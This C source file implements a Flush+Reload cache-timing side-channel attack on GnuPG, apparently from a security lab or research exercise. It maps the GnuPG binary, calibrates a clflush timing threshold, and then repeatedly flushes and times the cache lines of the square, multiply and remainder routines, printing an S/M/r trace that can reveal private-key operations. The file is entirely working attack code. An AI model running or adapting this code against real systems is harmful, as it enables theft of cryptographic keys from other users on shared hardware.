#include <time.h>
#include "../lib/util.h"
#include "../lib/gnupg.h"
#include <unistd.h>
#include <math.h>

void do_something() {
    for(int i=0;i < 100;i++) {
        int j = i*2;
        j++;
    }
    return;
}

int compare(const void * a, const void * b)
{
    return ( *(int*)a - *(int*)b );
}

#define NUM_ACCESSES 1000
unsigned long long get_clflush_threshold (void *flush_addr) {
    long long access_times[NUM_ACCESSES];
    long long first_half_mean = 0, second_half_mean = 0;
    volatile void *y = (volatile void *)flush_addr;

    for (int i = 0; i < NUM_ACCESSES; i++) {
        if (i % 2 == 0)
            clflush((void *)y);
        do_something();
        access_times[i] = measure_one_block_access_time ((void *)y);
    }

    qsort (access_times, NUM_ACCESSES, sizeof (long long), compare);
    for (int i = 0; i < NUM_ACCESSES; i++)
        if (i < (NUM_ACCESSES / 2))
            first_half_mean += access_times[i];
        else
            second_half_mean += access_times[i];
    first_half_mean /= (NUM_ACCESSES / 2);
    second_half_mean /= (NUM_ACCESSES / 2);
    return floor (0.8 * first_half_mean + 0.2 * second_half_mean);
}

int main() {
    int fd = open(gnupg_path, O_RDONLY);
    unsigned char *addr;
    unsigned long long THRESHOLD;
    void *s_addr, *m_addr, *r_addr;

    if (fd < 3)
    {
        perror ("Error: ");
        return 3;
    }

    // map the binary (upto 64 MB)
    addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    THRESHOLD = get_clflush_threshold ((void *)addr);
    printf ("THRESHOLD = %lld\n", THRESHOLD);

    if (addr == (void *) -1)
        return 4;

    s_addr = addr + square_add - base_add;
    m_addr = addr + multiply_add - base_add;
    r_addr = addr + remainder_add - base_add;
    // continuously probe the cache line
    long long s = 0, m = 0, r = 0, i = 0;
    while (i < 1000000) {
        unsigned long long atime;

        clflush(m_addr);
        clflush(r_addr);
        clflush(s_addr);

        atime = measure_one_block_access_time ((void *) m_addr);
        if (atime < THRESHOLD)
        {
            printf ("M");
            m++;
        }

        atime = measure_one_block_access_time ((void *) r_addr);
        if (atime < THRESHOLD)
        {
            printf ("r");
            r++;
        }

        atime = measure_one_block_access_time ((void *) s_addr);
        if (atime < THRESHOLD)
        {
            printf ("S");
            s++;
        }
        i++;
        do_something();
    }
    printf ("\n");
    return 0;
}
